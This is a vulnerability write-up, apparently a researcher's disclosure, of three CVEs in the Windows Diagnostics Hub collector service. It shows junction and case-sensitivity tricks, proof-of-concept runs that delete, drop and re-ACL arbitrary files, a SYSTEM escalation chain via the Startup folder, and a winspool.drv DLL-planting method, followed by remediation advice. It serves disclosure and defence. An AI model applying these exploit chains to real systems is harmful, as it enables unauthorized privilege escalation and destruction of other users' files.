# Microsoft DiagHub case-sensitivity Elevation of Privileges (EoP) vulnerability

## Abstract

The Microsoft (R) Diagnostics Hub Standard Collector Service is a default component of Microsoft Windows operating system.
This report is about a flaw in the `Diagnostics Hub Standard Collector Service DCOM` class that is available to all users of the OS (includes `NT AUTHORITY\Authenticated Users`):

CLSID: `42CBFAA7-A4A7-47BB-B422-BD10E9D02700`
Launch permissions: `O:BAG:BAD:(A;;CCDCSW;;;PS)(A;;CCDCSW;;;AU)(A;;CCDCSW;;;SY)(A;;CCDCSW;;;BA)(A;;CCDCSW;;;AC)(A;;CCDCSW;;;S-1-15-3-1024-3153509613-960666767-3724611135-2725662640-12138253-543910227-1950414635-4190290187)S:(ML;;NX;;;LW)`
Access permissions:
`O:BAG:BAD:(A;;CCDCSW;;;AU)(A;;CCDCSW;;;SY)(A;;CCDCSW;;;BA)(A;;CCDC;;;AC)(A;;CCDC;;;S-1-15-3-1024-3153509613-960666767-3724611135-2725662640-12138253-543910227-1950414635-4190290187)(A;;CCDCSW;;;IU)S:(ML;;NX;;;LW)`

The vulnerable part of the implementation resides in `DiagnosticsHub.StandardCollector.Runtime.dll`.

The service is running as `NT_AUTHORITY\SYSTEM`.

The service is vulnerable to directory traversal which could lead data tampering and dropping files to arbitrary directories.

DiagHub has a long history of security flaws.

Due to lack of free time, the whole article here is pretty much the same as the original report I submitted to Microsoft.

## Details

The service supports starting diagnostics sessions for what the caller can specify a "scratch directory". File operations are carried out without impersonating the caller,
but using a custom security measure instead (`Microsoft::DiagnosticsHub::StandardCollector::SecuredDirectory::SecuredDirectory`) to ensure the caller is not able to interfere
with the files until a session is destroyed.

The directory path provided by the client is opened with `CreateFileW` and then validated in the `ValidateSamePath` functions, which relies on the
`GetFinalPathNameByHandleW` WinAPI that returns with the final path of the opened file without any junctions or redirections in the name.
This final resolved path is then compared to the user supplied string. In case of a mismatch, the operation is aborted.
The string comparision is done using the `wcsnicmp` function, which is case-insensitive.

Though the operating system features a case-insensitive layer by default, the NTFS file system is case-sensitive. See James Foreshaw's excellent analysis here:

https://www.tiraniddo.dev/2019/02/ntfs-case-sensitivity-on-windows.html

If Windows Subsystem for Linux is installed (or Docker Desktop), or due to any other reasons the per directory case-insensitivity feature is enabled, 
the construct described above can be circumvented. Think about a directory layout like this:

```
C:\Projects\windows-dcom-hacks\work\DiagHub\1\wsldir>dir
2020. 11. 22.  21:19    <DIR>          ETW
2020. 11. 22.  21:18    <JUNCTION>     Etw [C:\Projects\windows-dcom-hacks\work\DiagHub\1\wsldir\ETW]
2020. 11. 22.  21:17    <DIR>          etw
```

An attacker could supply the path to the `Etw` junction to Diaghub as scratch directory, then it would be possible to switch between directories during the diaghub operations.

If you prefer to enable this feature manually, you can create `NtfsEnableDirCaseSensitivity` DWORD with value 1 at
`HKLM\SYSTEM\CurrentControlSet\Control\FileSystem`

## Vulnerability #1 (CVE-2021-28321): deleting arbitrary files

As a potential exploitation, I'm demonstrating here an arbitrary file delete attack. This abuses the `DiagHubCommon::DeleteDirectory` method invoked when a session is stopped.

```
long __thiscall
Microsoft::DiagnosticsHub::StandardCollector::EtwCollectionSessionController::AddEtwSessionResultsToPackage

    ATL::
    CStringT<unsigned_short,class_ATL::StrTraitATL<unsigned_short,class_ATL::ChTraitsCRT<unsigned_short>_>_>
    ::AppendFormat((
                    CStringT<unsigned_short,class_ATL::StrTraitATL<unsigned_short,class_ATL::ChTraitsCRT<unsigned_short>_>_>
                    *)&local_178,(ushort *)L"%sEP",local_170);
    lpFileName = local_178;
    DVar4 = GetFileAttributesW((LPCWSTR)local_178);
    if (DVar4 != 0xffffffff) {
      DiagHubCommon::DeleteDirectory(lpFileName,(bool)uVar8);
    }
```

`DeleteDirectory` is called with parameter `scratchdir\guid\EP`. If this path exists, all of its content is removed recursively.

A protection measure against file system redirections seems to be in place; the skeleton of the recursive method looks something as follows:

```
handle = CFileSystemIterator::Initialize(lpFileName)

if(DeleteVolumeMountPointW(lpFileName) != 0)
   return;
   
if(RemoveDirectoryW((LPCWSTR)param_1) != 0) 
   return;
   
do {
  if(isDir(subpath)) {
      DiagHubCommon::DeleteDirectory(subpath);
  } else {
      DeleteFileW(subpath);
  }
} while(CFileSystemIterator::Next(handle))
FindClose(handle)
```

If `EP` is a junction that points to the external directory to be deleted and we keep a handle open to this reparse point (the EP directory itself), we can easily route the execution flow 
to actually delete files outside the scratch directory.

Demo:

A "secret" file of a victim user:

```
Microsoft Windows [Version 10.0.19042.630]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Users\irsl>whoami
windows-10-dev-\irsl

C:\Users\irsl>mkdir secret

C:\Users\irsl>echo secret > secret\secret.txt
```

The local attacker:

```
C:\111\poc-1\poc-1\bin>whoami
windows-10-dev-\unprivileged

C:\111\poc-1\poc-1\bin>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\111\poc-1\poc-1\bin>type C:\Users\irsl\secret\secret.txt
Access is denied.

C:\111\poc-1\poc-1\bin>del C:\Users\irsl\secret\secret.txt
Access is denied.

C:\111\poc-1\poc-1\bin>DiagHubFileDeletePoc.exe
Usage: DiagHubFileDeletePoc path-to-a-dir-for-scratch path-to-directory-to-be-deleted

C:\111\poc-1\poc-1\bin>DiagHubFileDeletePoc.exe c:\111\poc-1\workdir C:\Users\irsl\secret
Case sensitive dir created successfully c:\111\poc-1\workdir\diaghub-delete-poc
Exeucuting command: CMD.exe /c mklink /d /j "c:\111\poc-1\workdir\diaghub-delete-poc\Etw" "c:\111\poc-1\workdir\diaghub-delete-poc\etw"
Junction created for c:\111\poc-1\workdir\diaghub-delete-poc\Etw <<===>> c:\111\poc-1\workdir\diaghub-delete-poc\etw
Preparation succeeded
Exeucuting command: VSDiagnostics.exe start 79FE9A49-935D-430B-B619-C919D9A46D22 /loadAgent:514a5e80-cc1b-4844-9139-0da4afdcf814;NetworkCollectionAgent.dll /scratchLocation:c:\111\poc-1\workdir\diaghub-delete-poc\Etw

Microsoft (R) VS Standard Collector

Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
Got the collector service reference
Scratch path: c:\111\poc-1\workdir\diaghub-delete-poc\Etw
Creating a new session with guid: 79fe9a49-935d-430b-b619-c919d9a46d22
Session created
Loading agent: 514a5e80-cc1b-4844-9139-0da4afdcf814 -> NetworkCollectionAgent.dll
Session 79FE9A49-935D-430B-B619-C919D9A46D22: {79fe9a49-935d-430b-b619-c919d9a46d22}
  Running
Exeucuting command: CMD.exe /c mklink /d /j "c:\111\poc-1\workdir\diaghub-delete-poc\Etw" "c:\111\poc-1\workdir\diaghub-delete-poc\ETW"
Junction created for c:\111\poc-1\workdir\diaghub-delete-poc\Etw <<===>> c:\111\poc-1\workdir\diaghub-delete-poc\ETW
Exeucuting command: CMD.exe /c mklink /d /j "c:\111\poc-1\workdir\diaghub-delete-poc\ETW\79FE9A49-935D-430B-B619-C919D9A46D22\EP" "C:\Users\irsl\secret"
Junction created for c:\111\poc-1\workdir\diaghub-delete-poc\ETW\79FE9A49-935D-430B-B619-C919D9A46D22\EP <<===>> C:\Users\irsl\secret
Exeucuting command: VSDiagnostics.exe stop 79FE9A49-935D-430B-B619-C919D9A46D22 /output:-

Microsoft (R) VS Standard Collector

Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
Exception from HRESULT: 0xC111004E
   at Microsoft.DiagnosticsHub.StandardCollector.ICollectionSessionNative.Stop()
   at Microsoft.DiagnosticsHub.StandardCollector.CollectorActions.Stop(RuntimeOptions options) in C:\Projects\windows-dcom-hacks\work\DiagHub\1\vsdiag\VSDiagnostics.Native\DiagnosticsHub\StandardCollector\CollectorActions.cs:line 177
   at Microsoft.DiagnosticsHub.StandardCollector.Program.Main(String[] args) in C:\Projects\windows-dcom-hacks\work\DiagHub\1\vsdiag\VSDiagnostics.Native\DiagnosticsHub\StandardCollector\Program.cs:line 56

Done!
```


The file was indeed deleted, verifying with the other user (the victim):

```
C:\Users\irsl>dir secret\secret.txt
 Volume in drive C is Windows
 Volume Serial Number is D460-7EB1

 Directory of C:\Users\irsl\secret

File Not Found

C:\Users\irsl>type secret\secret.txt
The system cannot find the file specified.
```


Proof of concept code is attached (`DiagHubFileDeletePoc`). The other project (`VSDiagnostics.Native`) is a slightly enhanced version of Visual Studio 2017's builtin tool
(installed by default to `C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\Team Tools\DiagnosticsHub\Collector`), adjusted to work with the OS's diaghub 
service (instead of VS's diaghub which is a similar service with similar API but different IIDs and some more minor differences).


## Vulnerability #2 (CVE-2021-28322): dropping files outside the scratch directory (no control over the content)

The second potential attack vector is tricking the service to drop files outside the scratch directory.

This abuses creation of the Report.{guid} directories.
The first steps of this attack are the same, the `Etw` junction needs to be swapped, but this is a race condition, so timing is also important here.

It needs to be replaced after the `CreateDirectoryW("Report.{guid}", ...)` call in

```
void __thiscall
Microsoft::DiagnosticsHub::StandardCollector::SecuredDirectory::SecuredDirectory
          (SecuredDirectory *this,ushort *param_1,void *param_2,bool param_3)
```


After the `Report` dir was created, we can replace the base symlink:

```
rmdir Etw
mklink /d /j Etw ETW
Junction created for Etw <<===>> ETW
```

Then, we can create one more junction with the name of `Report` directory:

```
mklink /d /j Report.0197E42F-003D-4F91-A845-6404CF289E84 "c:\Program Files\7-Zip\Lang"
Junction created for Report.0197E42F-003D-4F91-A845-6404CF289E84 <<===>> c:\Program Files\7-Zip\Lang
```

Before:

```
dir "c:\Program Files\7-Zip\Lang"\metadata.xml
 Volume in drive C has no label.
 Volume Serial Number is 5EAB-40D5

 Directory of c:\Program Files\7-Zip\Lang

File Not Found
```

After the attack succeeded:

```
dir "c:\Program Files\7-Zip\Lang"\metadata.xml
 Volume in drive C has no label.
 Volume Serial Number is 5EAB-40D5

 Directory of c:\Program Files\7-Zip\Lang

11/22/2020  02:22 PM               221 metadata.xml
```

As part of the normal operation, DiagHub calls `SetNamedSecurityInfoW` on this file to grant access to the caller of the API.

I managed to improve the exploit a little bit, turning it into a file dropping primitive. The attacker has only partial control over the source content,
so this attack is not really practical in itself. 
As a preparation step, the exploit creates a object directory based symlink, using `James Forshaw`'s CreateSymlink.exe tool, like this:

```
Exeucuting command: CreateSymlink.exe c:\111\workdir\diaghub-file-write-poc\ETW\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\lock c:\111\workdir\diaghub-file-write-poc\etw\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\lock
Opened Link \RPC Control\lock -> \??\c:\111\workdir\diaghub-file-write-poc\etw\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\lock: 00000130
Exeucuting command: CreateSymlink.exe c:\111\workdir\diaghub-file-write-poc\ETW\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\metadata.xml c:\Windows\system32\dropped.dll
Opened Link \RPC Control\metadata.xml -> \??\c:\Windows\system32\dropped.dll: 00000130
```

The `etw` (legit), `ETW` (malicios) and `Etw` (dir junction) trick is still needed to make the `ValidateSamePath` method happy. The exploit monitors the report directory,
once it shows up, it flips the `Etw` link to point to `ETW` (where the above links had already been created).
This also means this is a race condition between DiagHub and the exploit code, but the attack is quite reliable.

```
The fully working example:

C:\111\bin>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\111\bin>DiagHubFileWritePoc.exe
Usage: DiagHubFileWrite path-to-a-dir-for-scratch path-to-file-to-(over)write
The target path may be an existing or non-existing file


C:\111\bin>DiagHubFileWritePoc.exe c:\111\workdir c:\Windows\system32\dropped.dll
Case sensitive dir created successfully c:\111\workdir\diaghub-file-write-poc
Exeucuting command: CreateSymlink.exe c:\111\workdir\diaghub-file-write-poc\ETW\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\lock c:\111\workdir\diaghub-file-write-poc\etw\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\lock
Exeucuting command: CreateSymlink.exe c:\111\workdir\diaghub-file-write-poc\ETW\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\metadata.xml c:\Windows\system32\dropped.dll
Preparation succeeded, using report dir Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F
Exeucuting command: VSDiagnostics.exe start 3902E32D-DD66-4419-8A7C-FF37778EFD7F /loadAgent:e485d7a9-c21b-4903-892e-303c10906f6e;DiagnosticsHub.StandardCollector.Runtime.dll /scratchLocation:c:\111\workdir\diaghub-file-write-poc\Etw
Opened Link \RPC Control\lock -> \??\c:\111\workdir\diaghub-file-write-poc\etw\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\lock: 00000130
Press ENTER to exit and delete the symlink
Opened Link \RPC Control\metadata.xml -> \??\c:\Windows\system32\dropped.dll: 00000130
Press ENTER to exit and delete the symlink

Microsoft (R) VS Standard Collector

Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
Got the collector service reference
Scratch path: c:\111\workdir\diaghub-file-write-poc\Etw
Creating a new session with guid: 3902e32d-dd66-4419-8a7c-ff37778efd7f
Session created
Loading agent: e485d7a9-c21b-4903-892e-303c10906f6e -> DiagnosticsHub.StandardCollector.Runtime.dll
Session 3902E32D-DD66-4419-8A7C-FF37778EFD7F: {3902e32d-dd66-4419-8a7c-ff37778efd7f}
  Running
Monitoring report directory to show up: c:\111\workdir\diaghub-file-write-poc\etw\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F
Executing the report generation process
Exeucuting command: VSDiagnostics.exe stop 3902E32D-DD66-4419-8A7C-FF37778EFD7F /output:-

Microsoft (R) VS Standard Collector

Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
report dir has shown up, c:\111\workdir\diaghub-file-write-poc\Etw replaced to c:\111\workdir\diaghub-file-write-poc\ETW
Stop returned with: c:\111\workdir\diaghub-file-write-poc\Etw\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F
Session 3902E32D-DD66-4419-8A7C-FF37778EFD7F: {3902e32d-dd66-4419-8a7c-ff37778efd7f}
  Stopped
Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
Done!

C:\111\bin>type c:\Windows\system32\dropped.dll
<?xml version="1.0" encoding="UTF-8"?>
<Package xmlns="urn:diagnosticshub-package-metadata-2-1">
  <Tools />
  <Content />
  <Metadata>
    <Item Key="_BuildVersion">10.0.10011.16384</Item>
  </Metadata>
</Package>
```


Note: since this attack relies on a race condition, you might need to execute the tool multiple times. 


## Vulnerability #3 (CVE-2021-28313): taking over file permissions of existing files

While researching this flaw, I found it was possible to abuse the call to `SetNamedSecurityInfoW` (via `SecuredDirectory::ExposeDirectory`) in a reliable way.
If you call `SetNamedSecurityInfoW` with `pObjectName` specifying a directory junction and request it to propagate inherited ACEs, it won't iterate over the
sub objects of the container (where the junction points to). But, if you call that function with a link hosted in the object directory, then the permissions
of the target of the link will be adjusted as requsted.

The stucture would look something like this:

- `Etw` - directory junction originally pointing to etw - this is the path specified for diaghub

- `etw` - directory used by DiagHub originally to save its payload

- `ETW` - directory junction pointing to \RPC Control

- `\\?\RPC Control\Report.guid` link pointing to the file to modify its permissions

A fully working example:

```
C:\111\bin>whoami
windows-10-dev-\unprivileged

C:\111\bin>icacls c:\Windows\system32\dropped.dll
c:\Windows\system32\dropped.dll NT AUTHORITY\SYSTEM:(I)(F)
                                BUILTIN\Administrators:(I)(F)
                                BUILTIN\Users:(I)(RX)
                                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files


C:\111\bin>DiagHubSetNamedSecurityInfoTakeover.exe
Usage: DiagHubSetNamedSecurityInfoTakeover path-to-a-dir-for-scratch path-to-file-to-take-over [delay_ms]

Context:
There is a race condition to win. The operations and their order in DiagHub:
1) lock file created
2) metadata.xml file created
3) SetNamedSecurityInfoW is called on the directory

Successful exploitation needs a junction point to be replaced between 2 and 3.
If we are too fast, the service won't be able to create metadata.xml (and will throw)
If we are too slow, SetNamedSecurityInfoW is invoked on the legit target.

This tool monitors the presence of the lock file. Once it shows up, it sleeps a little (3rd parameter)
then it replaces the junction point. Suggestion: start with zero delay (which is also the default).
If you see an exception, it means the delay should be increased a bit (recommendation: 10ms)
If you don't encounter an exception, but the permissions of the destination file are still the original
you need to decrease the delay.

While this might sound complicated, my experience is that no delay usually works, as SetNamedSecurityInfoW
is invoked even when the metadata.xml file couldn't be created.

C:\111\bin>DiagHubSetNamedSecurityInfoTakeover.exe c:\111\workdir c:\Windows\system32\dropped.dll
Case sensitive dir created successfully c:\111\workdir\diaghub-acl-takeover-poc
Exeucuting command: CreateSymlink.exe c:\111\workdir\diaghub-acl-takeover-poc\ETW\Report.DACC1E2D-8935-48EE-B65E-067C51F9E2F2 "c:\Windows\system32\dropped.dll"
Preparation succeeded, using report dir Report.DACC1E2D-8935-48EE-B65E-067C51F9E2F2
Exeucuting command: VSDiagnostics.exe start DACC1E2D-8935-48EE-B65E-067C51F9E2F2 /loadAgent:e485d7a9-c21b-4903-892e-303c10906f6e;DiagnosticsHub.StandardCollector.Runtime.dll /scratchLocation:c:\111\workdir\diaghub-acl-takeover-poc\Etw
Opened Link \RPC Control\Report.DACC1E2D-8935-48EE-B65E-067C51F9E2F2 -> \??\c:\Windows\system32\dropped.dll: 00000130
Press ENTER to exit and delete the symlink

Microsoft (R) VS Standard Collector

Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
Got the collector service reference
Scratch path: c:\111\workdir\diaghub-acl-takeover-poc\Etw
Creating a new session with guid: dacc1e2d-8935-48ee-b65e-067c51f9e2f2
Session created
Loading agent: e485d7a9-c21b-4903-892e-303c10906f6e -> DiagnosticsHub.StandardCollector.Runtime.dll
Session DACC1E2D-8935-48EE-B65E-067C51F9E2F2: {dacc1e2d-8935-48ee-b65e-067c51f9e2f2}
  Running
Monitoring file to show up: c:\111\workdir\diaghub-acl-takeover-poc\etw\Report.DACC1E2D-8935-48EE-B65E-067C51F9E2F2\lock
Executing the report generation process
Exeucuting command: VSDiagnostics.exe stop DACC1E2D-8935-48EE-B65E-067C51F9E2F2 /output:-

Microsoft (R) VS Standard Collector

Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
lock file has shown up, c:\111\workdir\diaghub-acl-takeover-poc\Etw replaced to c:\111\workdir\diaghub-acl-takeover-poc\ETW
Stop returned with: c:\111\workdir\diaghub-acl-takeover-poc\Etw\Report.DACC1E2D-8935-48EE-B65E-067C51F9E2F2
Session DACC1E2D-8935-48EE-B65E-067C51F9E2F2: {dacc1e2d-8935-48ee-b65e-067c51f9e2f2}
  Stopped
Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
Done! Run:
icacls c:\Windows\system32\dropped.dll

C:\111\bin>icacls c:\Windows\system32\dropped.dll
c:\Windows\system32\dropped.dll BUILTIN\Administrators:(F)
                                NT AUTHORITY\SYSTEM:(F)
                                windows-10-dev-\unprivileged:(M,DC)
                                NT AUTHORITY\SYSTEM:(I)(F)
                                BUILTIN\Administrators:(I)(F)
                                BUILTIN\Users:(I)(RX)
                                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files


C:\111\bin>echo arbitrary content > c:\Windows\system32\dropped.dll

C:\111\bin>type c:\Windows\system32\dropped.dll
arbitrary content
```

## Combining the pieces of the puzzle to elevate privileges

At this point we have got a primitive to drop files to a destination directory, we have control over the file name but not its content (vuln #2).
We can also take over ownership of existing files (vuln #3). Combining these two gives us control over the content as well, which is usually powerful
enough to elevate privileges to `NT_AUTHORITY\SYSTEM`. (Things are nowadays more complicated due to TrustedInstaller owning pretty much everything that
belongs to the operating system.)

The dummy way of accomplishing this would be by abusing the feature of the `Startup` directory of the operating system.

```
C:\111\bin>whoami
windows-10-dev-\unprivileged

C:\111\bin>DiagHubSetNamedSecurityInfoTakeover.exe c:\111\workdir c:\Users\irsl
Case sensitive dir created successfully c:\111\workdir\diaghub-acl-takeover-poc
Exeucuting command: CreateSymlink.exe c:\111\workdir\diaghub-acl-takeover-poc\ETW\Report.A8687212-25B5-4536-BEF9-A4BE776C1476 "c:\Users\irsl"
Preparation succeeded, using report dir Report.A8687212-25B5-4536-BEF9-A4BE776C1476
Exeucuting command: VSDiagnostics.exe start A8687212-25B5-4536-BEF9-A4BE776C1476 /loadAgent:e485d7a9-c21b-4903-892e-303c10906f6e;DiagnosticsHub.StandardCollector.Runtime.dll /scratchLocation:c:\111\workdir\diaghub-acl-takeover-poc\Etw
Opened Link \RPC Control\Report.A8687212-25B5-4536-BEF9-A4BE776C1476 -> \??\c:\Users\irsl: 00000130
Press ENTER to exit and delete the symlink

Microsoft (R) VS Standard Collector

Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
Got the collector service reference
Scratch path: c:\111\workdir\diaghub-acl-takeover-poc\Etw
Creating a new session with guid: a8687212-25b5-4536-bef9-a4be776c1476
Session created
Loading agent: e485d7a9-c21b-4903-892e-303c10906f6e -> DiagnosticsHub.StandardCollector.Runtime.dll
Session A8687212-25B5-4536-BEF9-A4BE776C1476: {a8687212-25b5-4536-bef9-a4be776c1476}
  Running
Monitoring file to show up: c:\111\workdir\diaghub-acl-takeover-poc\etw\Report.A8687212-25B5-4536-BEF9-A4BE776C1476\lock
Executing the report generation process
Exeucuting command: VSDiagnostics.exe stop A8687212-25B5-4536-BEF9-A4BE776C1476 /output:-

Microsoft (R) VS Standard Collector

Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
lock file has shown up, c:\111\workdir\diaghub-acl-takeover-poc\Etw replaced to c:\111\workdir\diaghub-acl-takeover-poc\ETW
Stop returned with: c:\111\workdir\diaghub-acl-takeover-poc\Etw\Report.A8687212-25B5-4536-BEF9-A4BE776C1476
Session A8687212-25B5-4536-BEF9-A4BE776C1476: {a8687212-25b5-4536-bef9-a4be776c1476}
  Stopped
Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
Done! Run:
icacls c:\Users\irsl

C:\111\bin>icacls c:\Users\irsl
c:\Users\irsl BUILTIN\Administrators:(F)
              BUILTIN\Administrators:(OI)(CI)(IO)(F)
              NT AUTHORITY\SYSTEM:(F)
              NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
              windows-10-dev-\unprivileged:(M,DC)
              windows-10-dev-\unprivileged:(OI)(CI)(IO)(RX,M,D,WD,AD,DC,WA)
              NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(RX)
              BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
              Everyone:(I)(RX)
              Everyone:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files


C:\111\bin>copy DiagHubProof.exe "c:\users\irsl\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        1 file(s) copied.
```

Where `irsl` is a local administrator. After the next time he logs in:

```
C:\111\bin>type c:\diaghub-proof.txt
windows-10-dev-\irsl

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

Later on, I kept researching to find a more professional way to accomplish the same. 
There are some well-known tricks for the same goal (e.g. via [DiagHub](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html) or [usoclient](https://itm4n.github.io/usodllloader-part1/)), but they are not working anymore.

I found a new one in the Winspool service, or the more official name `Printer Extensions and Notifications service` (`854A20FB-2D44-457D-992F-EF13785D2B51`).
It is not running by default but can be activated by any users and then it will be spawned as `NT_AUTHORITY\SYSTEM`. Using OLEView.NET:

```
$c = Get-ComClass -Clsid '854A20FB-2D44-457D-992F-EF13785D2B51'
$o = New-ComObject -Class $c -ClassContext LOCAL_SERVER
```

This service, while starting up, loads a dll dependency called `winspool.drv`. Since the current directory has higher precedence in the search order, the first attempt is `C:\Windows\System32\spool\drivers\x64\3\winspool.drv` (where it is not present normally). An attacker could combine a file dropper primitive (e.g. the one above) to exploit 
this flaw and elevate privileges to `NT_AUTHORITY\SYSTEM`.

To demonstrate this, I created a copy of `winspool.drv` (from `C:\Windows\System32`), modified the `api-ms-win-core-apiquery-l1-1-0.dll` reference to `mod-ms-win-core-apiquery-l1-1-0.dll` using 
a hex editor, and then placed the modified `winspool.drv` file and the `mod-ms-win-core-apiquery-l1-1-0.dll` files in `C:\Windows\System32\spool\drivers\x64\3`.
The `mod-ms-win-core-apiquery-l1-1-0.dll` file was compiled with a `DllMain` entry point writing to a file `C:\dll.log`. This was working as expected on my Windows desktop (`10.0.18363.1198`), 
meaning `C:\dll.log` was indeed created as expected.

I also tested this on a dev insider VM, and I found the loader refused to work with this DLL. As a next step, I created another copy of the legit `winspool.drv` and modified a simple text string of it (to break code signing signatures) and triggered loading the Printer Extensions service again. The dll was loaded:

![winspool-drv-loading-modified-file-on-devinsider.png](https://github.com/irsl/microsoft-diaghub-case-sensitivity-eop-cve/raw/main/winspool-drv-loading-modified-file-on-devinsider.png "winspool-drv-loading-modified-file-on-devinsider.png")

The conclusion: this attack primitive is working on dev insider version of Windows (though weaponization of it would require some further efforts).



# Recommendations how to remediate these flaws

- Save the caller's token at creating the session and impersonate them during the file operations. This would require some refactoring, but would probably the most secure approach.

- In the SecureDirectory implementation, leverage the file handle already open at the root of the scratch directory (opened in the constructor). Then, at subsequent file operations, 
  you could rely on `NtCreateFile` and the `POBJECT_ATTRIBUTES` parameter, opening the subdirectories and files relative to the handle of the scratch directory itself.

- Make the comparision case-sensitive (this might break some integrations - but since this is not an officially documented interface, probably shouldn't matter).

Remark:
- At the `GetFinalPathNameByHandleW` call, if you consider to traverse the directory path up to the root and verify if any of the path components are case sensitive, remember that
  this directory attribute on the parent file descriptors can be modified even if there is an open file handle on the scratchdir, and the legit scratchdir (`etw`) itself does not 
  need to be case-sensitive.

And an additional security measure:
- in `DiagHubCommon::DeleteDirectory`, verify the return code of `RemoveDirectoryW`. If it is access denied, abort the operation. This way reparse points
  would either be removed or files in the destination would remain intact.

Note: this is what I recommended Microsoft to remediate the flaw and I didn't verify what they actually implemented to resolve these issues.


## Ok, how about the bounty?

Though this was rated important severity, Microsoft doesn't pay a bounty that involves symlinks or junction points, as they are experimenting with a new generic protection
measure against attacks like this. While such a feature coming is nice, it is also a bit unfair as it is not available for the time being, not even in the insider builds.
No money, no t-shirt, no mug.

Futhermore, this is a story of a reverse bounty in this case :) I used Azure to host an Windows Insider Preview VM (as I didn't want to reinstall/upgrade my desktop).
I was shocked next month when my credit card was charged for this instance the first time, and deleted it immediately. Next month I was shocked once again, when I learned it
actually didn't remove the disks... The invaluable take away: always create a resource group for your stuff and always clean up by removing the resource group not individual
components.

## Timeline

2020-11-25: Initial report submitted to MSRC. Textbox filled with "Please find the full report in the attached zip file"
2020-11-25: ... 30 minutes later: "This thread is being closed and no longer monitored" (lol, they must be flooded with reports really)
2020-11-25: Resubmitted with an excerpt from the full report (the textbox has a length constraint...)
2020-11-25: "Your report has been received and you should receive a follow-up message from the case manager once your case has been fully reviewed."
